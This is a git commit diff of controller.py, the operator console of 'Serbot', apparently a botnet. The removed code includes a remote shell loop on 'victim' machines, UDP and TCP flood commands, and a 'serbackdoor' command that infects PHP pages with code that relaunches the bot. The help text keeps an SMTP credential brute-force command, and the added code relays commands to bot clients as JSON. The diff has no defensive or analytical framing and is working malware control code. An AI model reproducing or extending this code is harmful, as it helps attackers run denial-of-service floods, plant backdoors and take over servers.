a97f1c42b5d48f429a9b2e9c56c689c0bd0967c8
D0L0S <ricklwebb@gmail.com>
2015-05-20 21:44:26 +0100

    Update controller.py

--- controller.py
+++ controller.py
@@ -15,11 +15,9 @@ intro = """
 ||S |||e |||r |||b |||o |||t ||
 ||__|||__|||__|||__|||__|||__||
 |/__\|/__\|/__\|/__\|/__\|/__\|
-
-Coded by: dotcppfile
-Twitter: https://twitter.com/dotcppfile
-Blog: http://dotcppfile.worpdress.com
 """
+
+_API_VERSION = 'v0.1'
 
 commands = """
 
@@ -58,19 +56,27 @@ custombruteforce <address>:<port>:<email>:<keys>:<min>:<max>
 	Example: custombruteforce smtp.whatever.com:587:something@whatever.com:abcdefghi:4:6
 
 \n"""
-
+	
+	
 class control():
+
+	def jsonDecode(self, string, value):
+		parsed_json = json.loads(string)
+		status = (parsed_json["status"])
+		if status == "OK":
+			result = (parsed_json[value])
+			if result == "list":
+				print string
+			else: 
+				reply = (parsed_json["reply"])
+			return str(reply)
+		else:
+			error = (parsed_json["error"])
+			return str(error)
 
 	def main(self):
 		print intro
-		Commands = {"accept":"Accept connections", "list":"List connections", 
-				   "clear":"Clear the console", "quit":"Close all connections and quit", 
-				   "credits":"Show Credits", "help":"Show this message",
-				   "interact":"Interact with client", "stop":"Stop interacting with client",
-				   "udpflood <ip>:<port>":"UDP flood threw client", 
-				   "tcpflood":"TCP flood threw client", 
-				   "serbackdoor":"Infects all PHP Pages with Malicious Code that will run the Serbot Client again",
-				   "rmbackdoor":"Removes the Malicious PHP Code"}
+		
 		try:
 			s=socket(AF_INET, SOCK_STREAM)
 			s.connect((args.host,args.port))
@@ -81,78 +87,44 @@ class control():
 		login = json.dumps(login)
 		s.send(login)
 
-
-		while 1:
-			command = raw_input("> ")
+		while True:
+			command = raw_input("$")
 			try:
-				if (command == "accept"):
-					s.send("accept")
-					print s.recv(20480)
-				elif (command == "list"):
-					s.send("list")
-					print s.recv(20480)
-				elif ("interact " in command):
-					s.send(command)
-					temporary = s.recv(20480)
-					if ("ERROR" not in temporary):
-						victimpath = s.recv(20480)
-						if ("ERROR" not in victimpath):
-							breakit = False
-							while (breakit == False):
-								msg = raw_input(victimpath)
-								allofem = msg.split(";")
-								for onebyone in allofem: #This your happy day one liners
-									if (onebyone == "stop"):
-										s.send("stop")
-										print "\n"
-										breakit = True
-									elif ("cd " in onebyone):
-										s.send(onebyone)
-										victimpath = s.recv(20480)
-										if ("ERROR" in victimpath):
-											print victimpath
-											breakit = True
-									elif (onebyone == ""):
-										print "[CONTROLLER] Nothing to be sent...\n"
-									else:
-										s.send(onebyone)
-										print s.recv(20480)
-						else:
-							print victimpath
-							break
-					else:
-						print temporary
-				elif (("udpfloodall " in command) or ("tcpfloodall " in command)):
-					s.send(command)
-					print "\n"
-				elif (command == "selfupdateall"):
-					s.send("selfupdateall")
-					print "\n"		
-				elif(command == "clear"):
+				if(command == "clear"):
 					if sys.platform == 'win32':
 						os.system("cls")
 					else:
 						os.system("clear")
-				elif(command == "quit"):
-					s.send("quit")
-					s.close()
-					break
 				elif(command == "help"):
 					print commands
-				elif(command == "credits"):
-					print "--------\nCredits:\n--------\nCoded by: dotcppfile\nTwitter: https://twitter.com/dotcppfile\nBlog: http://dotcppfile.worpdress.com\n"
+				elif(command == "interact"): 
+					client = raw_input(" [#] Client Number:")
+					Cmd = {"command": command, "client":client}
+					Cmd = json.dumps(Cmd)
+					s.send(Cmd)
+					reply = s.recv(20480)
+					print reply
+
 				else:
-					print "[CONTROLLER] Invalid Command\n"
+					Cmd = {'command': command}
+					Cmd = json.dumps(Cmd)
+					s.send(Cmd)
+					reply = s.recv(20480)
+					decode = control.jsonDecode(self, reply, "command")
+					reply = s.recv(20480)
+					print reply
+
 			except KeyboardInterrupt:
 				try:
 					s.send("quit")
 					s.close()
-					print ""
+					print " [!] Connection Closed"
 					break
 				except:
 					pass
-			except:
-				print "[CONTROLLER] Connection Closed"
+			except Exception as e:
+				print e
+				print " [!] Connection Closed"
 				s.close()
 				break
 
@@ -166,4 +138,3 @@ if __name__=="__main__":
 						version=' [+] Version: 1.0')
 	args = parser.parse_args()
 	control().main()
-
